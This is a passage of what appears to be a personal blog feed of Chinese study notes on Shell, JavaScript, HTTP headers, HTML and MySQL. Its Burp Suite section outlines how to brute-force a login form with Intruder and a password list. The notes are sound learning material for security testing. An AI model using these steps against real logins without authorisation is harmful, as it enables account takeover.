test.sh</code><br><code>/bin/php test.php</code></p><h2 id="Shell-变量"><a href="#Shell-变量" class="headerlink" title="Shell 变量"></a><code>Shell 变量</code></h2><p>变量是用于存储数据值的名称。<br>your_name&#x3D;”runoob”</p><h3 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h3><p>在变量名前面加美元符号<br>your_name&#x3D;”qinjx”<br>echo $your_name<br>echo ${your_name}<br>加花括号是为了帮助解释器识别变量的边界</p><h3 id="只读变量"><a href="#只读变量" class="headerlink" title="只读变量"></a>只读变量</h3><p>readonly 命令</p><h3 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h3><p>unset 命令<br>不能删除只读变量。</p><h3 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h3><h4 id="字符串变量"><a href="#字符串变量" class="headerlink" title="字符串变量"></a>字符串变量</h4><p>使用单引号 ‘ 或双引号 “ 来定义字符串</p><h4 id="整数变量"><a href="#整数变量" class="headerlink" title="整数变量"></a>整数变量</h4><p>使用 declare 或 typeset 命令来声明整数变量</p><h4 id="数组变量"><a href="#数组变量" class="headerlink" title="数组变量"></a>数组变量</h4><p>允许在一个变量中存储多个值<br>数组可以是整数索引数组或关联数组</p><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><p>这些是由操作系统或用户设置的特殊变量，用于配置 Shell 的行为和影响其执行环境。</p><h4 id="特殊变量"><a href="#特殊变量" class="headerlink" title="特殊变量"></a>特殊变量</h4><p>有一些特殊变量在 <code>Shell </code>中具有特殊含义<br>例如 <code>$0 </code>表示脚本的名称，<code>$1, $2</code>, 等表示脚本的参数。<br><code>$#</code>表示传递给脚本的参数数量，<code>$?</code> 表示上一个命令的退出状态等。</p><h2 id="Shell-字符串"><a href="#Shell-字符串" class="headerlink" title="Shell 字符串"></a><code>Shell 字符串</code></h2><h3 id="单引号"><a href="#单引号" class="headerlink" title="单引号"></a>单引号</h3><p>单引号字符串的限制：<br>单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的；<br>单引号字符串中不能出现单独一个的单引号（对单引号使用转义符后也不行），但可成对出现，作为字符串拼接使用。</p><h3 id="双引号"><a href="#双引号" class="headerlink" title="双引号"></a>双引号</h3><p>双引号的优点：<br>双引号里可以有变量<br>双引号里可以出现转义字符</p><h3 id="拼接字符串"><a href="#拼接字符串" class="headerlink" title="拼接字符串"></a>拼接字符串</h3><h3 id="获取字符串长度"><a href="#获取字符串长度" class="headerlink" title="获取字符串长度"></a>获取字符串长度</h3><h3 id="提取子字符串"><a href="#提取子字符串" class="headerlink" title="提取子字符串"></a>提取子字符串</h3><p>string&#x3D;”runoob is a great site”<br>echo ${string:1:4} # 输出 unoo</p><h3 id="查找子字符串"><a href="#查找子字符串" class="headerlink" title="查找子字符串"></a>查找子字符串</h3><p>string&#x3D;”runoob is a great site”</p><p><code>echo expr index &quot;$string&quot; io  # 输出 4</code></p><h2 id="Shell-传递参数"><a href="#Shell-传递参数" class="headerlink" title="Shell 传递参数"></a><code>Shell 传递参数</code></h2><p>脚本内获取参数的格式为<code> $n</code>，n 代表一个数字，1 为执行脚本的第一个参数，2 为执行脚本的第二个参数。<br><code>$0</code> 为执行的文件名（包含文件路径）</p><h2 id="Shell-数组"><a href="#Shell-数组" class="headerlink" title="Shell 数组"></a><code>Shell 数组</code></h2><p>bash支持一维数组（不支持多维数组），并且没有限定数组的大小。<br>数组元素的下标由 0 开始编号。</p><h3 id="定义数组"><a href="#定义数组" class="headerlink" title="定义数组"></a>定义数组</h3><p>用括号来表示数组，数组元素用”空格”符号分割开。<br>数组名&#x3D;(值1 值2 … 值n)<br>还可以单独定义数组的各个分量：<br>array_name[0]&#x3D;value0<br>array_name[1]&#x3D;value1<br>array_name[n]&#x3D;valuen</p><h3 id="读取数组"><a href="#读取数组" class="headerlink" title="读取数组"></a>读取数组</h3><p><code>$&#123;数组名[下标]&#125;</code><br>使用 @ 符号可以获取数组中的所有元素：<br><code>echo $&#123;array_name[@]&#125;</code><br>在数组前加一个感叹号 ! 可以获取数组的所有键<br>获取数组的长度</p><h3 id="取得数组元素的个数"><a href="#取得数组元素的个数" class="headerlink" title="取得数组元素的个数"></a>取得数组元素的个数</h3><p><code>length=$&#123;#array_name[@]&#125;</code></p><p>或者</p><p><code>length=$&#123;#array_name[*]&#125;</code></p><h3 id="取得数组单个元素的长度"><a href="#取得数组单个元素的长度" class="headerlink" title="取得数组单个元素的长度"></a>取得数组单个元素的长度</h3><p><code>length=$&#123;#array_name[n]&#125;</code></p><h3 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h3><p><code>declare 命令</code><br><code>declare -A array_name -A 选项就是用于声明一个关联数组。 访问关联数组元素可以使用指定的键： array_name[&quot;index&quot;]</code></p><h2 id="Shell-基本运算符"><a href="#Shell-基本运算符" class="headerlink" title="Shell 基本运算符"></a><code>Shell 基本运算符</code></h2><h2 id="Shell-echo命令"><a href="#Shell-echo命令" class="headerlink" title="Shell echo命令"></a><code>Shell echo命令</code></h2><h2 id="Shell-printf-命令"><a href="#Shell-printf-命令" class="headerlink" title="Shell printf 命令"></a><code>Shell printf 命令</code></h2><p><code>printf  format-string  [arguments...]</code><br><code>format-string: 一个格式字符串，它包含普通文本和格式说明符。 arguments: 用于填充格式说明符的参数列表。 格式说明符由 % 字符开始，后跟一个或多个字符，用于指定输出的格式。</code></p><h2 id="Shell-test-命令"><a href="#Shell-test-命令" class="headerlink" title="Shell test 命令"></a><code>Shell test 命令</code></h2><p><code>Shell中的 test 命令用于检查某个条件是否成立，它可以进行数值、字符和文件三个方面的测试。</code></p><h2 id="Shell-流程控制"><a href="#Shell-流程控制" class="headerlink" title="Shell 流程控制"></a><code>Shell 流程控制</code></h2><h3 id="if"><a href="#if" class="headerlink" title="&#96;if"></a>&#96;if</h3><p>if 语句语法格式：<br>if condition<br>then<br>  command1<br>fi<br>写成一行（适用于终端命令提示符）：<br>if [ $(ps -ef | grep -c “ssh”) -gt 1 ]; then echo “true”; fi&#96;</p><h3 id="if-else"><a href="#if-else" class="headerlink" title="&#96;if else"></a>&#96;if else</h3><p>if else 语法格式：<br>if condition<br>then<br>    command1<br>else<br>    command<br>fi&#96;</p><h3 id="if-else-if-else"><a href="#if-else-if-else" class="headerlink" title="if else-if else"></a><code>if else-if else</code></h3><p><code>if else-if else 语法格式： if condition1 then     command1 elif condition2  then      command2 else     commandN fi if else 的 [...] 判断语句中大于使用 -gt，小于使用 -lt。 if [ &quot;$a&quot; -gt &quot;$b&quot; ]; then     ... fi 如果使用 ((...)) 作为判断语句，大于和小于可以直接使用 &gt; 和 &lt;。 if (( a &gt; b )); then     ... fi</code></p><h3 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a><code>for 循环</code></h3><p><code>for循环一般格式为: for var in item1 item2 ... itemN do     command1     command2      ...      commandN done 写成一行： for var in item1 item2 ... itemN; do command1; command2… done;</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/09/24/JavaScript/"/>
      <url>/2024/09/24/JavaScript/</url>
      
        <content type="html"><![CDATA[<h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><p><strong>JavaScript 是一种脚本编程语言，它可以在网页上实现实时的内容更新。</strong></p><h5 id="直接写入-HTML-输出流"><a href="#直接写入-HTML-输出流" class="headerlink" title="直接写入 HTML 输出流:"></a>直接写入 HTML 输出流:</h5><p>document.write(“<code>&lt;h1&gt;这是一个标题&lt;/h1&gt;</code>“);</p><p>document.write(“<code>&lt;p&gt;这是一个段落。&lt;/p&gt;</code>“);</p><h5 id="对事件的反应"><a href="#对事件的反应" class="headerlink" title="对事件的反应:"></a>对事件的反应:</h5><p><code>&lt;button type=&quot;button&quot; onclick=&quot;alert(&#39;欢迎!&#39;)&quot;&gt;点我!&lt;/button&gt;</code></p><h5 id="改变-HTML-内容"><a href="#改变-HTML-内容" class="headerlink" title="改变 HTML 内容:"></a>改变 HTML 内容:</h5><p>x&#x3D;document.getElementById(“demo”);  &#x2F;&#x2F;查找元素<br>x.innerHTML&#x3D;”Hello JavaScript”;    &#x2F;&#x2F;改变内容</p><h5 id="改变-HTML-图像"><a href="#改变-HTML-图像" class="headerlink" title="改变 HTML 图像:"></a>改变 HTML 图像:</h5><script>function changeImage(){    element=document.getElementById('myimage')    if (element.src.match("bulbon"))    {        element.src="/images/pic_bulboff.gif";    }    else    {        element.src="/images/pic_bulbon.gif";    }}</script><p><code>&lt;img id=&quot;myimage&quot; onclick=&quot;changeImage()&quot; src=&quot;/images/pic_bulboff.gif&quot; width=&quot;100&quot; height=&quot;180&quot;&gt;</code><br>element.src.match(“bulbon”) ：检索 <code>&lt;img id=&quot;myimage&quot; onclick=&quot;changeImage()&quot; src=&quot;/images/pic_bulboff.gif&quot; width=&quot;100&quot; height=&quot;180&quot;&gt; </code>里面 src 属性的值有没有包含 bulbon 这个字符串，如果存在字符串 bulbon，图片 src 更新为 bulboff.gif，若匹配不到 bulbon 字符串，src 则更新为 bulbon.gif</p><h5 id="改变-HTML-样式（属于改变-HTML-属性的变种）"><a href="#改变-HTML-样式（属于改变-HTML-属性的变种）" class="headerlink" title="改变 HTML 样式（属于改变 HTML 属性的变种）:"></a>改变 HTML 样式（属于改变 HTML 属性的变种）:</h5><p>x&#x3D;document.getElementById(“demo”)  &#x2F;&#x2F;找到元素<br>x.style.color&#x3D;”#ff0000”;           &#x2F;&#x2F;改变样式</p><h5 id="验证输入"><a href="#验证输入" class="headerlink" title="验证输入:"></a>验证输入:</h5><p>if isNaN(x) {<br>    alert(“不是数字”);<br>}</p><h4 id="JavaScript-用法"><a href="#JavaScript-用法" class="headerlink" title="JavaScript 用法"></a>JavaScript 用法</h4><p>HTML 中的 Javascript 脚本代码必须位于 <strong><script></strong> 与 <strong></script></strong> 标签之间。</p><p>Javascript 脚本代码可被放置在 HTML 页面的 <strong><body></strong> 和 <strong><head></strong> 部分中。</p><h4 id="JavaScript-语法"><a href="#JavaScript-语法" class="headerlink" title="JavaScript 语法"></a>JavaScript 语法</h4><h5 id="JavaScript-变量"><a href="#JavaScript-变量" class="headerlink" title="JavaScript 变量"></a>JavaScript 变量</h5><p>变量用于存储数据值。</p><p>使用关键字 <strong>var</strong> 来定义变量。</p><h5 id="JavaScript-函数"><a href="#JavaScript-函数" class="headerlink" title="JavaScript 函数"></a>JavaScript 函数</h5><p>调用函数(执行函数内的语句)。</p><h4 id="事件监听程序"><a href="#事件监听程序" class="headerlink" title="事件监听程序"></a>事件监听程序</h4><h5 id="addEventListener-方法"><a href="#addEventListener-方法" class="headerlink" title="addEventListener() 方法"></a>addEventListener() 方法</h5><p>element.addEventListener(event, function, useCapture);<br>第一个参数是事件的类型（比如 “click” 或 “mousedown”）。<br>第二个参数是当事件发生时我们需要调用的函数。<br>第三个参数是布尔值，指定使用事件冒泡还是事件捕获。此参数是可选的。<br>注意：请勿对事件使用 “on” 前缀；请使用 “click” 代替 “onclick”。</p><h5 id="选取HTML元素"><a href="#选取HTML元素" class="headerlink" title="选取HTML元素"></a>选取HTML元素</h5><p>1.getElementById(id): 通过元素的 id 属性来选中元素。<br>var element &#x3D; document.getElementById(“要选的元素”);<br>2.getElementsByClassName(name): 通过元素的 class 属性来选中元素。<br>var elements &#x3D; document.getElementsByClassName(“要选的元素”);<br>3.getElementsByTagName(name): 通过元素的标签名来选中元素。<br>var elements &#x3D; document.getElementsByTagName(“元素的标签名”);</p><h5 id="添加-修改属性值"><a href="#添加-修改属性值" class="headerlink" title="添加&#x2F;修改属性值"></a>添加&#x2F;修改属性值</h5><p>使用 Object.defineProperty<br>使用 Object.defineProperty() 函数可以为对象添加属性，或者修改现有属性。如果指定的属性名在对象中不存在，则执行添加操作；如果在对象中存在同名属性，则执行修改操作。<br>Object.defineProperty(object, propertyname, descriptor);<br>object：指定要添加或修改属性的对象，可以是 JavaScript 对象或者 DOM 对象。<br>propertyname：表示属性名的字符串。<br>descriptor：定义属性的描述符，包括对数据属性或访问器属性。</p><h5 id="创建HTML标签"><a href="#创建HTML标签" class="headerlink" title="创建HTML标签"></a>创建HTML标签</h5><p>Document.createElement()<br>createElement(tagName) createElement(tagName, options)</p><h5 id="添加属性"><a href="#添加属性" class="headerlink" title="添加属性"></a>添加属性</h5><p>setAttribute()<br>element.setAttribute(attribute, value);<br>element是要添加属性的HTML元素对象，attribute是要添加的属性名，value是要设置的属性值。<br>将元素添加到DOM中<br>parentElement.appendChild()</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Burpsuite和HTTP</title>
      <link href="/2024/09/07/Burpsuite%E5%92%8CHTTP/"/>
      <url>/2024/09/07/Burpsuite%E5%92%8CHTTP/</url>
      
        <content type="html"><![CDATA[<h3 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h3><p>1.Proxy：用于拦截和修改HTTP请求和响应，并允许用户在发送到目标服务器之前手动修改请求内容。</p><p>1.1.Intercept:允许用户拦截应用程序的HTTP和HTTPS请求，查看和修改请求，然后转发到目标服务器。使用Intercept，用户可以深入分析应用程序的请求和响应，并查找潜在的漏洞。Intercept还可以帮助用户快速验证漏洞的利用。  </p><p>在浏览器上安装Proxy SwitchyOmega,进行快速代理。</p><p>须将浏览器的流量包转移到burpsuit上，burpsuit再进行发包。</p><p>1.2.HTTP history:记录了所有被拦截的请求和响应，使用户能够查看和分析以前的请求和响应。用户可以使用过滤器来搜索特定请求和响应，以便更轻松地查找和分析流量。</p><p>2.Target：用于设置测试目标，并让Burp Suite扫描目标应用程序以发现漏洞。</p><p>3.Dashboard:用于执行自动化漏洞扫描，包括SQL注入、跨站脚本等多种漏洞。</p><p>4.Repeater:用于显示请求和响应的详细信息，包括HTTP头和正文。</p><p>5.Intruder:用于发送请求的多个副本，以测试目标服务器的响应是否相同。</p><p>  1.<strong>设置代理</strong>：开启浏览器代理，配置burp代理ip，注意要与浏览器代理ip一致（建议使用8080端口）</p><p>  2.<strong>抓包</strong>:切换到Proxy菜单，拦截开关开启（intercept is on），点击open browser打开浏览器</p><p>  3.<strong>send to Intruder</strong>(Ctrl+I)</p><p>​    <strong>Positions</strong>: 对需要处理的参数（账号，密码）做变量处理(一个参数做变量，选择Sniper;两个以上，选择Cluser Bomb)</p><p>​    点击需要操作变量的参数，点击add按钮</p><p>​    <strong>Payloads</strong>：载入密码文本</p><p>  4.<strong>Start attack</strong></p><p>  5.<strong>查看结果</strong>：扫描完成后，Intruder会显示每个尝试的响应，包括成功登录和失败的情况。通过分析响应，可以判断哪些密码尝试有效。</p><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>HTTP是一种用作获取诸如 HTML 文档这类资源的协议。它是 Web 上进行任何数据交换的基础，同时，也是一种客户端—服务器（client-server）协议，也就是说，请求是由接受方，通常是 Web 浏览器发起的。</p><p>URL<br>URL（统一资源定位符）是因特网中的唯一资源的地址。它是浏览器用于检索已发布资源（例如 HTML 页面、CSS 文档、图像等）的关键机制之一。<br>HTTP请求包结构<br>1.起始行：用于描述要执行的请求，或者是对应的状态，成功或失败。这个起始行总是单行的。<br>2.一个可选的 HTTP 标头集合指明请求或描述消息主体（body）。<br>3.一个空行指示所有关于请求的元数据已经发送完毕。<br>4.一个可选的包含请求相关数据的主体（比如 HTML 表单内容），或者响应相关的文档。主体的大小有起始行的 HTTP 头来指定。<br>请求头列表<br>1.User-Agent：标识客户端使用的浏览器和操作系统信息。<br>Accept: text&#x2F;plain, text&#x2F;html<br>可以通过$_SERVER[‘HTTP_USER_AGENT’]获取。<br>2.Accept：指定客户端能够处理的内容类型，即可接受的媒体类型。<br>可以通过$_SERVER[‘HTTP_ACCEPT’]获取。<br>3.Accept-Charset：浏览器可以接受的字符编码集<br>Accept-Charset: iso-8859-5<br>4.Accept-Encoding：指定浏览器可以支持的web服务器返回内容压缩编码类型<br>Accept-Encoding: compress, gzip<br>5.Accept-Language：浏览器可接受的语言<br>Accept-Language: en,z<br>6.Accept-Ranges：可以请求网页实体的一个或者多个子范围字段<br>Accept-Ranges: bytes<br>7.Content-Type：指定请求体中的数据格式类型。常见的取值有application&#x2F;json、application&#x2F;x-www-form-urlencoded等。<br>可以通过$_SERVER[‘CONTENT_TYPE’]获取。<br>8.Date：请求发送的日期和时间。<br>9.Authorization：用于进行身份验证的凭证信息。常见的取值有Bearer Token、Basic Authentication等。<br>可以通过$_SERVER[‘HTTP_AUTHORIZATION’]获取。<br>10.Cookie：包含来自客户端的Cookie信息。<br>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。<br>Cookie: role&#x3D;admin;ssid&#x3D;1<br>可以通过$_SERVER[‘HTTP_COOKIE’]获取。<br>11.Referer：指示当前请求是从哪个URL页面发起的。<br>可以通过$_SERVER[‘HTTP_REFERER’]获取。<br>12.Host：指定服务器的域名或IP地址。<br>可以通过$_SERVER[‘HTTP_HOST’]获取。<br>13.X-Requested-With：指示请求是否由Ajax发起的。通常在Ajax请求中会设置该头部字段，取值为”XMLHttpRequest”。<br>可以通过$_SERVER[‘HTTP_X_REQUESTED_WITH’]获取。<br>14.Content-Length：指定请求体的长度。<br>Content-Length: 348<br>可以通过$_SERVER[‘CONTENT_LENGTH’]获取。<br>15.Cache-Control：控制缓存行为的指令。用于指定客户端和代理服务器如何缓存响应<br>Cache-Control: no-cache<br>可以通过$_SERVER[‘HTTP_CACHE_CONTROL’]获取<br>16.X-Forwarded-For（XFF）：是一个事实上的用于标识通过代理服务器连接到 web 服务器的客户端的原始 IP 地址的标头<br>17.Connection：表示是否需要持久连接<br> &#x2F;&#x2F; HTTP 1.1默认进行持久连接<br>Connection: close<br>18.Expect：请求的特定的服务器行为<br>19.From：发出请求的用户的Email<br>GET与POST的区别<br>GET 请求主要用于从服务器获取数据。</p><p>参数和 URL之间用问号<code>?</code>隔开, 参数键值用等号<code>=</code>连接,然后参数之间用连接符<code>&amp;</code>拼接起来</p><h3 id="数据包格式："><a href="#数据包格式：" class="headerlink" title="数据包格式："></a>数据包格式：</h3><h4 id="1-GET-请求数据包格式："><a href="#1-GET-请求数据包格式：" class="headerlink" title="1.GET 请求数据包格式："></a>1.GET 请求数据包格式：</h4><p> 请求行：<code>GET /path/to/resource?param1=value1&amp;m2=value2 HTTP/1.1</code></p><p> 请求参数：参数会附加在 URL 后面，形如<code>?param1=value1&amp;m2=value2</code></p><h4 id="2-POST-请求数据包格式："><a href="#2-POST-请求数据包格式：" class="headerlink" title="2.POST 请求数据包格式："></a>2.POST 请求数据包格式：</h4><p>请求行：<code>POST /path/to/resource HTTP/1.1</code></p><p>请求头（Headers）：包含一些元数据信息，如 Content-Type（内容类型）、Content-Length（内容长度）等。</p><p> 请求体（Body）：放置实际提交的数据，不同的 Content-Type 决定了数据的格式，可以是表单数据、JSON、XML 等。</p><p>多次发送相同的 GET 请求会产生相同的结果，不会对服务器状态产生影响。<br>这使得 GET 请求适合用于获取静态资源，如网页、图片、文件等。<br>POST 请求主要用于向服务器提交数据，通常用于创建、更新或删除资源。它将请求的参数作为请求体的一部分发送到服务器。POST 请求是非幂等的，即多次发送相同的 POST 请求可能会产生不同的结果，因为它可能会改变服务器的状态。<br>GET 和 POST 请求的存在是为了满足不同的需求。GET 请求适用于获取数据，而 POST 请求适用于提交数据并对服务器状态进行更改。选择正确的请求方法取决于请求的性质和预期的服务器操作。</p><p>GET比POST更不安全，因为GET参数会直接暴露在url上。所以不能用来传递敏感信息get 请求的参数传递方式<br>在 HTTP 请求中，GET 请求可以通过 URL 参数或者请求体的方式传递参数。</p><h4 id="1-URL-参数：GET-请求可以通过-URL-中指定的-key-value-形式传递参数。"><a href="#1-URL-参数：GET-请求可以通过-URL-中指定的-key-value-形式传递参数。" class="headerlink" title="1.URL 参数：GET 请求可以通过 URL 中指定的 key-value 形式传递参数。"></a>1.URL 参数：GET 请求可以通过 URL 中指定的 key-value 形式传递参数。</h4><h4 id="2-请求体（仅适用于-POST、PUT、PATCH-请求）：当-POST、PUT-或-PATCH-请求的-URL-中没有指定参数时，参数会被放置在请求体中。"><a href="#2-请求体（仅适用于-POST、PUT、PATCH-请求）：当-POST、PUT-或-PATCH-请求的-URL-中没有指定参数时，参数会被放置在请求体中。" class="headerlink" title="2.请求体（仅适用于 POST、PUT、PATCH 请求）：当 POST、PUT 或 PATCH 请求的 URL 中没有指定参数时，参数会被放置在请求体中。"></a>2.请求体（仅适用于 POST、PUT、PATCH 请求）：当 POST、PUT 或 PATCH 请求的 URL 中没有指定参数时，参数会被放置在请求体中。</h4><p>请求体中的数据可以是表单数据、JSON 数据等。<br>例如，使用 POST 请求将 JSON 数据发送到如下 URL 时，请求体中的 JSON 数据如下：<br>{<br> “name”: “John Doe”,<br> “email”: “<a href="mailto:&#x6a;&#x6f;&#104;&#110;&#46;&#x64;&#111;&#101;&#64;&#101;&#120;&#97;&#109;&#x70;&#108;&#101;&#x2e;&#99;&#x6f;&#109;">&#x6a;&#x6f;&#104;&#110;&#46;&#x64;&#111;&#101;&#64;&#101;&#120;&#97;&#109;&#x70;&#108;&#101;&#x2e;&#99;&#x6f;&#109;</a>“<br>}</p><h3 id="HTTP-1"><a href="#HTTP-1" class="headerlink" title="HTTP"></a>HTTP</h3><p>HTTP&#x2F;1.1虽然是无状态协议,但为了实现期望的保持状态功能, 于是引入了Cookie技术。有了Cookie再用HTTP协议通信,就可以管 理状态了。</p><p>会话（Session）跟踪是Web程序中常用的技术，用来跟踪用户的整个会话。常用的跟踪技术就是Cookie和Session。</p><p><strong>Cookie通过在客户端记录信息确定用户身份，Session通过在服务器记录确定用户身份。</strong></p><h4 id="1-请求报文格式"><a href="#1-请求报文格式" class="headerlink" title="1.请求报文格式"></a>1.请求报文格式</h4><p><method><request-URL><version><br><headers></p><entity-body><h4 id="2-响应报文格式"><a href="#2-响应报文格式" class="headerlink" title="2.响应报文格式"></a>2.响应报文格式</h4><p><version><status><reason-phrase><br><headers></p><entity-body>method<h3 id="HTTP动词"><a href="#HTTP动词" class="headerlink" title="HTTP动词"></a>HTTP动词</h3><p>常见方法：HEAD &#x2F; GET &#x2F; POST &#x2F; PUT &#x2F; DELETE &#x2F; PATCH &#x2F; OPTIONS &#x2F; TRACE<br>扩展方法：LOCK &#x2F; MKCOL &#x2F; COPY &#x2F; MOVE<br>version<br>报文使用的HTTP版本<br>格式为HTTP&#x2F;<major>.<minor><br>HTTP状态返回代码 1xx（临时响应）<br>表示临时响应并需要请求者继续执行操作的状态代码。<br>100 继续 服务器返回此代码表示已收到请求的第一部分，正在等待其余部分<br>101切换协议请求者已要求服务器切换协议，服务器已确认并准备切换<br> HTTP状态返回代码 2xx （成功）<br>表示成功处理了请求的状态代码。<br>HTTP状态返回代码 3xx （重定向）<br>表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。<br>HTTP状态返回代码 4xx（请求错误）<br>HTTP状态返回代码 5xx（服务器错误）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HTMl和MYSQL</title>
      <link href="/2024/09/07/HTMl%E5%92%8CMYSQL/"/>
      <url>/2024/09/07/HTMl%E5%92%8CMYSQL/</url>
      
        <content type="html"><![CDATA[<h4 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h4><p>超文本标记语言是一种用于创建网页的标准标记语言。<br>可以使用 HTML 来建立自己的 WEB 站点，HTML 运行在浏览器上，由浏览器来解析。<br>HTML 是用来描述网页的一种语言。<br>HTML 是一种标记语言<br>标记语言是一套标记标签<br>HTML 使用标记标签来描述网页</p><h4 id="HTML语法结构"><a href="#HTML语法结构" class="headerlink" title="HTML语法结构"></a>HTML语法结构</h4><p><code>&lt;!DOCTYPE html&gt;</code><br><code>&lt;html&gt;</code></p><p><code>&lt;head&gt;</code></p><p><code>&lt;meta charset=&quot;utf-8&quot;&gt;</code></p><p><code>&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;</code></p><p><code>&lt;/head&gt;</code></p><p><code>&lt;body&gt;</code></p><p><code>&lt;h1&gt;我的第一个标题&lt;/h1&gt;</code></p><p><code>&lt;p&gt;我的第一个段落。&lt;/p &gt;</code></p><p><code>&lt;/body&gt;</code><br><code>&lt;/html&gt;</code></p><p><code>&lt;!DOCTYPE html&gt;</code> 声明为 HTML5 文档<br><code>&lt;html&gt;</code> 元素是 HTML 页面的根元素</p><p><code>&lt;head&gt; 元素包含了文档的元（meta）数据，如 &lt;meta charset=&quot;utf-8&quot;&gt; 定义网页编码格式为 utf-8。</code></p><p><code>&lt;title&gt; 元素描述了文档的标题</code><br><code>&lt;body&gt; 元素包含了可见的页面内容</code></p><p><code>&lt;h1&gt;</code> 元素定义一个大标题</p><p><code>&lt;p&gt;</code> 元素定义一个段落<br><code>&lt;button&gt;</code> 标签定义可点击的按钮<br><code>&lt;input&gt;</code>元素用于为基于 Web 的表单创建交互式控件，以便接受来自用户的数据<br><code>&lt;div&gt;</code>：内容划分元素<br><code>&lt;img&gt;</code> 标签用于在 HTML 页面中嵌入图像<br><code>&lt;iframe&gt;</code>表示嵌套的browsing context。它能够将另一个 HTML 页面嵌入到当前页面中<br><code>&lt;a&gt;</code> 标签定义超链接，用于从一张页面链接到另一张页面<br>id 全局属性定义了一个全文档唯一的标识符<br>从技术上讲，id 属性的值可以包含除了空白字符的任何字符。然而，为了避免无意中的错误，只能使用 ASCII 字母、数字、’_’ 和 ‘-‘，并且id 属性的值应该以字母开头。<br>全局属性 class 的值是一个以空格分隔的元素的类名列表，它允许 CSS 和 Javascript 通过类选择器 或 DOM 方法来选择和访问特定的元素。尽管对 class 的命名没有要求，但 web 开发者最好使用可以表达元素语义目的的名称。<br><code>&lt;img&gt;src</code>属性是必须的，它包含了你想嵌入的图片的路径。</p><ol><li><p>绝对 URL - 链接到托管在其他网站上的外部图像。</p></li><li><p>相对 URL - 链接到托管在网站内部的图像。<br><a>href 属性规定链接指向的页面的 URL。</p><h4 id="MySQL-是最流行的关系型数据库管理系统，关联数据库将数据保存在不同的表中。"><a href="#MySQL-是最流行的关系型数据库管理系统，关联数据库将数据保存在不同的表中。" class="headerlink" title="MySQL 是最流行的关系型数据库管理系统，关联数据库将数据保存在不同的表中。"></a>MySQL 是最流行的关系型数据库管理系统，关联数据库将数据保存在不同的表中。</h4><h4 id="SQL语句的分类"><a href="#SQL语句的分类" class="headerlink" title="SQL语句的分类"></a>SQL语句的分类</h4></li></ol><h4 id="1-DQL：数据查询语言（凡是带有select关键字的都是查询语句）"><a href="#1-DQL：数据查询语言（凡是带有select关键字的都是查询语句）" class="headerlink" title="1.DQL：数据查询语言（凡是带有select关键字的都是查询语句）"></a>1.DQL：数据查询语言（凡是带有select关键字的都是查询语句）</h4><p>  简单查询<br>  1.1查询一个字段<br>  select 字段名 from 表名；<br>  注意：<br>  select和from都是关键字。<br>  字段名和表名都是标识符。<br>  所有的SQL语句都以”;”结尾。</p><h4 id="2-DML：数据操作语言（凡是对表单中的数据进行增删改的都是DML）"><a href="#2-DML：数据操作语言（凡是对表单中的数据进行增删改的都是DML）" class="headerlink" title="2.DML：数据操作语言（凡是对表单中的数据进行增删改的都是DML）"></a>2.DML：数据操作语言（凡是对表单中的数据进行增删改的都是DML）</h4><p>  insert delete update<br>  insert   增<br>  delete  删<br>  update 改</p><h4 id="3-DDL：数据定义语言（凡是带有create、drop、alter的都是DDL）"><a href="#3-DDL：数据定义语言（凡是带有create、drop、alter的都是DDL）" class="headerlink" title="3.DDL：数据定义语言（凡是带有create、drop、alter的都是DDL）"></a>3.DDL：数据定义语言（凡是带有create、drop、alter的都是DDL）</h4><p>  DDL主要操作的是表的结构。<br>  create：新建，等同于增<br>  drop：删除<br>  alter：修改</p><h3 id="表的创建"><a href="#表的创建" class="headerlink" title="表的创建"></a>表的创建</h3><p>  建表的语法格式：（建表属于DDL语句）<br>  create table 表名（<br>   字段名1 数据类型,<br>   字段名2 数据类型<br>  ）;<br>  表名：建议以t_或者tbl_开始。<br>  表名和字段名都属于标识符。</p><h3 id="MySQL中的数据类型"><a href="#MySQL中的数据类型" class="headerlink" title="MySQL中的数据类型"></a>MySQL中的数据类型</h3><p>  varchar：可变长度的字符串<br>  会根据实际的数据长度动态分配空间。<br>  char：定长字符串<br>  int：数字中的整数型</p><h3 id="插入数据insert（DML）"><a href="#插入数据insert（DML）" class="headerlink" title="插入数据insert（DML）"></a>插入数据insert（DML）</h3><p>  语法格式：<br>  insert into 表名（字段名1,字段名2…) values(值1，值2)；<br>  注意：字段名和值要一一对应。<br>  数量、数据类型要对应。</p><h3 id="修改update（DML）"><a href="#修改update（DML）" class="headerlink" title="修改update（DML）"></a>修改update（DML）</h3><p>  语法格式：<br>  update 表名 set 字段名1&#x3D;值1,字段名2&#x3D;值2… where 条件;</p><h5 id="注释语法"><a href="#注释语法" class="headerlink" title="注释语法"></a>注释语法</h5><p>1.从一个 # 到行末。<br>2.从两个连续横杠 –  序列到行尾。 在MySQL中， - （两个连续横杠 ）注释样式要求第二个破折号后跟至少一个空格或控制字符（例如空格，制表符，换行符等）。<br>3.从一个 &#x2F;* 顺序到下一个* &#x2F;结束。</p><h5 id="查询逻辑"><a href="#查询逻辑" class="headerlink" 